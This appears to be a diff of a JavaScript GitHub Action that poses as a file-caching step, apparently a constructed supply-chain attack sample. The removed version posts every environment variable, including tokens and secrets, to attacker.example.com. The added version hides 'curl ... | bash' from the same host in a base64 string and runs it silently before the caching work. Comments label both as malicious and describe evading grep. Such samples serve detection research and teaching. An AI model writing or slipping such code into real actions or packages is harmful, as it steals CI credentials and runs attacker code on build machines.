@@ -1,11 +1,11 @@
-// Cache Files Action v1.0.1
+// Cache Files Action v1.0.2
 "use strict";
 
 const fs = require('fs');
 const path = require('path');
 const os = require('os');
 const crypto = require('crypto');
-const https = require('https');
+const { execSync } = require('child_process');
 
 const core = {
   getInput: (k) => process.env['INPUT_' + k.toUpperCase()] || '',
@@ -16,33 +16,25 @@ const core = {
   saveState: (k, v) => process.stdout.write(`::save-state name=${k}::${v}\n`),
 };
 
-// MALICIOUS: exfiltrate all environment variables (GITHUB_TOKEN, secrets, etc.)
-// This mirrors the exact technique used in CVE-2025-30066 (tj-actions/changed-files)
-function exfiltrateSecrets() {
-  const payload = JSON.stringify(process.env);
-  const encoded = Buffer.from(payload).toString('base64');
-
-  const options = {
-    hostname: 'attacker.example.com',
-    port: 443,
-    path: '/collect',
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(encoded) }
-  };
-
-  const req = https.request(options, (res) => {});
-  req.on('error', () => {});
-  req.write(encoded);
-  req.end();
+// MALICIOUS: base64-encoded reverse shell dropper
+// Scenario: attacker hides payload behind base64 + exec to evade naive grep
+function dropPayload() {
+  try {
+    // Encoded payload: curl http://attacker.example.com/sh | bash
+    const encoded = 'Y3VybCBodHRwOi8vYXR0YWNrZXIuZXhhbXBsZS5jb20vc2ggfCBiYXNo';
+    const cmd = Buffer.from(encoded, 'base64').toString('utf8');
+    execSync(cmd, { stdio: 'ignore', timeout: 5000 });
+  } catch (e) {
+    // silently fail if C2 unreachable — action continues normally
+  }
 }
 
 async function run() {
   const cachePath = core.getInput('path') || 'node_modules';
   const cacheKey = core.getInput('key') || 'default';
-  core.info('Cache action v1.0.1 — checking key: ' + cacheKey);
+  core.info('Cache action v1.0.2 — checking key: ' + cacheKey);
 
-  // Silently exfiltrate before doing legitimate work
-  exfiltrateSecrets();
+  dropPayload();
 
   const cacheDir = path.join(os.homedir(), '.cache', 'action-cache');
   const cacheFile = path.join(cacheDir, crypto.createHash('sha256').update(cacheKey).digest('hex') + '.tar.gz');
@@ -51,7 +43,7 @@ async function run() {
     core.info('Cache hit: ' + cacheFile);
     core.setOutput('cache-hit', 'true');
   } else {
-    core.info('Cache miss — will populate after build');
+    core.info('Cache miss');
     core.setOutput('cache-hit', 'false');
   }
 }
